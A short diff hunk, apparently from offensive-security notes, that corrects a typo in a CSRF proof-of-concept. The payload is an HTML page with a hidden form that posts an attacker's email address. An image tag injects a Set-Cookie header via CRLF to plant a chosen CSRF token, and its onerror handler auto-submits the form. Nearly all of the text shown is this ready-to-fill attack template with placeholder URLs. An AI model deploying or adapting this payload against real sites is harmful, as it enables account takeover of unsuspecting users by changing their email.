@@ -510,7 +510,7 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 &lt;html&gt;
     &lt;body&gt;
         &lt;form action=&quot;https://ACTION_URL.COM&quot; method=&quot;POST&quot;&gt;
-	    &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;ATTACKER@MAIL.HACKt&quot; /&gt;
+	    &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;ATTACKER@MAIL.HACK&quot; /&gt;
 	    &lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;YOUR_CSRF&quot; /&gt;
 	&lt;/form&gt;
 	&lt;img src=&quot;https://URL_WITH_PARAMETER_ASSIGNMENT/?PARAM=TEST%0d%0aSet-Cookie:%20csrf=NEEDED_CSRF_TOKEN%3b%20SameSite=None&quot; onerror=&quot;document.forms[0].submit();&quot; /&gt;
